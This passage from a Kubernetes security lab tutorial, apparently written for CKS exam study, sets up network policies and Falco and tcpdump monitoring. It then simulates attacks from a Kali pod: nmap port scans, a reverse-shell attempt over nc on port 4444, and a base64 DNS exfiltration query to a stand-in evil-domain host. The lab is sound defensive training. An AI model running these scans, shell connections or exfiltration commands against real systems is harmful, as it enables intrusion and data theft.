kind: Service
metadata:
  name: database-service
  namespace: database
spec:
  selector:
    app: database
  ports:
  - port: 3306
    targetPort: 3306
  type: ClusterIP
EOF

Subtask 1.3: Test Initial Connectivity (Before Network Policies)

Let's verify that all pods can communicate with each other before implementing security policies.

# Get pod information
kubectl get pods -A -o wide

# Test connectivity from frontend to backend
FRONTEND_POD=$(kubectl get pods -n frontend -l app=frontend -o jsonpath='{.items[0].metadata.name}')
BACKEND_IP=$(kubectl get service backend-service -n backend -o jsonpath='{.spec.clusterIP}')

echo "Testing connectivity from frontend to backend..."
kubectl exec -n frontend $FRONTEND_POD -- curl -s --connect-timeout 5 http://$BACKEND_IP

# Test connectivity from backend to database
BACKEND_POD=$(kubectl get pods -n backend -l app=backend -o jsonpath='{.items[0].metadata.name}')
DATABASE_IP=$(kubectl get service database-service -n database -o jsonpath='{.spec.clusterIP}')

echo "Testing connectivity from backend to database..."
kubectl exec -n backend $BACKEND_POD -- nc -zv $DATABASE_IP 3306

Subtask 1.4: Implement Network Policies

Now let's create network policies to restrict traffic flow according to security best practices.

# Create default deny-all policy for database namespace
cat << EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: database-deny-all
  namespace: database
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
EOF

# Create policy to allow only backend to access database
cat << EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: database-allow-backend
  namespace: database
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          tier: backend
    ports:
    - protocol: TCP
      port: 3306
EOF

# Create policy to restrict backend access
cat << EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-policy
  namespace: backend
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          tier: frontend
    ports:
    - protocol: TCP
      port: 80
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          tier: database
    ports:
    - protocol: TCP
      port: 3306
  - to: []
    ports:
    - protocol: UDP
      port: 53
EOF

Subtask 1.5: Test Network Policy Effectiveness

Verify that the network policies are working correctly by testing both allowed and blocked connections.

# Test allowed connection: frontend to backend
echo "Testing allowed connection: frontend to backend..."
kubectl exec -n frontend $FRONTEND_POD -- curl -s --connect-timeout 5 http://$BACKEND_IP

# Test blocked connection: frontend to database (should fail)
echo "Testing blocked connection: frontend to database..."
kubectl exec -n frontend $FRONTEND_POD -- nc -zv $DATABASE_IP 3306 || echo "Connection blocked as expected"

# Test allowed connection: backend to database
echo "Testing allowed connection: backend to database..."
kubectl exec -n backend $BACKEND_POD -- nc -zv $DATABASE_IP 3306

# View network policies
kubectl get networkpolicies -A

Task 2: Use Monitoring Tools to Track Network Traffic and Detect Anomalies
Subtask 2.1: Deploy Falco for Runtime Security Monitoring

Falco is an open-source runtime security monitoring tool that can detect anomalous behavior in containerized environments.

# Add Falco Helm repository
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install Falco with custom configuration
cat << EOF > falco-values.yaml
falco:
  grpc:
    enabled: true
  grpcOutput:
    enabled: true
  jsonOutput: true
  jsonIncludeOutputProperty: true
  
driver:
  kind: ebpf

falcoctl:
  artifact:
    install:
      enabled: true
    follow:
      enabled: true

services:
  - name: k8saudit
    enabled: true
EOF

# Deploy Falco
helm install falco falcosecurity/falco -n falco-system --create-namespace -f falco-values.yaml

Subtask 2.2: Configure Custom Falco Rules for Network Monitoring

Create custom rules to detect suspicious network activities.

# Create custom Falco rules
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-custom-rules
  namespace: falco-system
data:
  custom_rules.yaml: |
    - rule: Suspicious Network Connection
      desc: Detect connections to suspicious ports
      condition: >
        (fd.sport in (1337, 4444, 5555, 6666, 7777, 8888, 9999) or
         fd.dport in (1337, 4444, 5555, 6666, 7777, 8888, 9999)) and
        not proc.name in (ssh, sshd)
      output: >
        Suspicious network connection detected
        (user=%user.name command=%proc.cmdline connection=%fd.name)
      priority: WARNING
      tags: [network, suspicious]
    
    - rule: Unexpected Network Policy Violation
      desc: Detect attempts to bypass network policies
      condition: >
        k8s_audit and
        ka.verb in (create, update, patch, delete) and
        ka.target.resource=networkpolicies
      output: >
        Network policy modification detected
        (user=%ka.user.name verb=%ka.verb resource=%ka.target.resource name=%ka.target.name)
      priority: WARNING
      tags: [k8s_audit, network_policy]
EOF

Subtask 2.3: Set Up Network Traffic Monitoring with tcpdump

Monitor network traffic at the node level to capture and analyze packets.

# Create a monitoring pod with network tools
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: network-monitor
  namespace: monitoring
spec:
  hostNetwork: true
  containers:
  - name: monitor
    image: nicolaka/netshoot
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
      capabilities:
        add: ["NET_ADMIN", "NET_RAW"]
  nodeSelector:
    kubernetes.io/os: linux
EOF

# Wait for pod to be ready
kubectl wait --for=condition=Ready pod/network-monitor -n monitoring --timeout=60s

# Start packet capture in background
kubectl exec -n monitoring network-monitor -- tcpdump -i any -w /tmp/network-capture.pcap &

# Monitor network connections in real-time
kubectl exec -n monitoring network-monitor -- netstat -tuln

Subtask 2.4: Analyze Network Traffic Patterns

Use various tools to analyze the captured network traffic and identify patterns.

# View active connections
kubectl exec -n monitoring network-monitor -- ss -tuln

# Monitor network statistics
kubectl exec -n monitoring network-monitor -- cat /proc/net/dev

# Check for suspicious processes with network connections
kubectl exec -n monitoring network-monitor -- lsof -i

# Analyze captured packets (after some traffic generation)
kubectl exec -n monitoring network-monitor -- tcpdump -r /tmp/network-capture.pcap -n | head -20

Task 3: Simulate Network Attacks and Validate Policy Effectiveness
Subtask 3.1: Deploy Attack Simulation Tools

Create pods that will simulate various types of network attacks to test our security policies.

# Create attacker namespace
kubectl create namespace attacker
kubectl label namespace attacker tier=attacker

# Deploy attacker pod with penetration testing tools
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: attacker
spec:
  containers:
  - name: attacker
    image: kalilinux/kali-rolling
    command: ["/bin/bash"]
    args: ["-c", "apt-get update && apt-get install -y nmap netcat-traditional curl && sleep 3600"]
    securityContext:
      capabilities:
        add: ["NET_RAW", "NET_ADMIN"]
  restartPolicy: Never
EOF

# Wait for attacker pod to be ready
kubectl wait --for=condition=Ready pod/attacker-pod -n attacker --timeout=120s

Subtask 3.2: Simulate Port Scanning Attack

Test how well our network policies protect against reconnaissance attacks.

# Get target IPs
BACKEND_IP=$(kubectl get service backend-service -n backend -o jsonpath='{.spec.clusterIP}')
DATABASE_IP=$(kubectl get service database-service -n database -o jsonpath='{.spec.clusterIP}')

echo "Backend IP: $BACKEND_IP"
echo "Database IP: $DATABASE_IP"

# Simulate port scanning from attacker pod
echo "Performing port scan on backend service..."
kubectl exec -n attacker attacker-pod -- nmap -p 1-1000 $BACKEND_IP

echo "Performing port scan on database service..."
kubectl exec -n attacker attacker-pod -- nmap -p 1-5000 $DATABASE_IP

Subtask 3.3: Simulate Lateral Movement Attack

Test attempts to move laterally between different tiers of the application.

# Attempt direct connection to database from attacker namespace
echo "Attempting direct database connection from attacker..."
kubectl exec -n attacker attacker-pod -- nc -zv $DATABASE_IP 3306 || echo "Connection blocked by network policy"

# Attempt to connect to backend from attacker
echo "Attempting backend connection from attacker..."
kubectl exec -n attacker attacker-pod -- curl -s --connect-timeout 5 http://$BACKEND_IP || echo "Connection blocked or timed out"

# Try to establish reverse shell (should be blocked)
echo "Attempting reverse shell connection..."
kubectl exec -n attacker attacker-pod -- nc -l -p 4444 &
sleep 2
kubectl exec -n backend $BACKEND_POD -- nc $ATTACKER_IP 4444 || echo "Reverse shell blocked"

Subtask 3.4: Test DNS Exfiltration Prevention

Simulate DNS-based data exfiltration attempts and verify they are properly monitored.

# Attempt DNS queries to suspicious domains
echo "Testing DNS exfiltration detection..."
kubectl exec -n attacker attacker-pod -- nslookup malicious-domain.evil.com || echo "DNS query blocked or failed"

# Generate suspicious DNS traffic
kubectl exec -n attacker attacker-pod -- dig @8.8.8.8 $(echo "sensitive-data-12345" | base64).evil-domain.com || echo "Suspicious DNS query detected"

Subtask 3.5: Validate Policy Effectiveness

Review the effectiveness of our security policies by analyzing the attack results.

# Check Falco alerts for detected attacks
kubectl logs -n falco-system -l app.kubernetes.io/name=falco --tail=50

# Review network policy events
kubectl get events --all-namespaces --field-selector reason=NetworkPolicyViolation

# Check for any policy violations in logs
kubectl logs -n kube-system -l component=kube-proxy --tail=20

# Generate summary report
echo "=== Security Policy Validation Summary ==="
echo "1. Port scanning attempts: $(kubectl logs -n falco-system -l app.kubernetes.io/name=falco | grep -c "Suspicious network connection" || echo "0")"
echo "2. Network policy violations: $(kubectl get events --all-namespaces --field-selector reason=NetworkPolicyViolation --no-headers | wc -l)"
echo "3. Blocked connections: Verified through manual testing"

Troubleshooting Tips
Common Issues and Solutions

Issue: Network policies not taking effect Solution:

# Verify CNI plugin supports network policies
kubectl get nodes -o wide
kubectl describe node | grep -i cni

# Check if Calico is properly installed
kubectl get pods -n kube-system | grep calico

Issue: Falco not detecting events Solution:

# Check Falco pod status
kubectl get pods -n falco-system
kubectl logs -n falco-system -l app.kubernetes.io/name=falco

# Verify Falco configuration
kubectl get configmap -n falco-system

Issue: Attack simulations not working Solution:

# Verify attacker pod has necessary capabilities
kubectl describe pod attacker-pod -n attacker

# Check network connectivity
kubectl exec -n attacker attacker-pod -- ping -c 3 8.8.8.8

Verification Commands

# Verify all components are running
kubectl get pods -A | grep -E "(falco|calico|attacker|frontend|backend|database)"

# Check network policy status
kubectl get networkpolicies -A

# Verify monitoring is active
kubectl top pods -A
kubectl get events --sort-by='.lastTimestamp' | tail -10

Conclusion

In this advanced network security lab, you have successfully:

• Implemented comprehensive network policies that restrict traffic flow between different tiers of a Kubernetes application, following the principle of least privilege • Deployed and configured monitoring tools including Falco for runtime security monitoring and tcpdump for network traffic analysis • Simulated realistic attack scenarios including port scanning, lateral movement attempts, and DNS exfiltration to test security controls • Validated policy effectiveness through controlled testing and monitoring of security events

Why This Matters: Network security is critical in containerized environments where applications are distributed across multiple pods and namespaces. The skills you've learned help protect against common attack vectors including:

    Unauthorized lateral movement between application tiers
    Data exfiltration through network channels
    Reconnaissance attacks that map internal network topology
    Privilege escalation through network access

Real-World Applications: These techniques are essential for:

    Securing production Kubernetes clusters in enterprise environments
    Meeting compliance requirements for data protection and network segmentation
    Implementing zero-trust network architectures
    Detecting and responding to advanced persistent threats (APTs)

The combination of proactive security policies and comprehensive monitoring provides a robust defense-in-depth strategy that is essential for modern cloud-native security operations. Continue practicing these skills and stay updated with the latest security threats and mitigation techniques to maintain effective network security postures.













---

## 🎓 CKS Exam Domains

| Domain | Weight |
|--------|--------|
| Cluster Setup | 10% |
| Cluster Hardening | 15% |
| System Hardening | 15% |
| Microservice Vulnerabilities | 20% |
| Supply Chain Security | 20% |
| Monitoring & Runtime Security | 20% |

---

**Created by:** Saleem Ali | Al-Nafi International College | January 2026
**Status:** ✅ CKS-Exam-Ready | **Prereq:** Valid CKA Required!
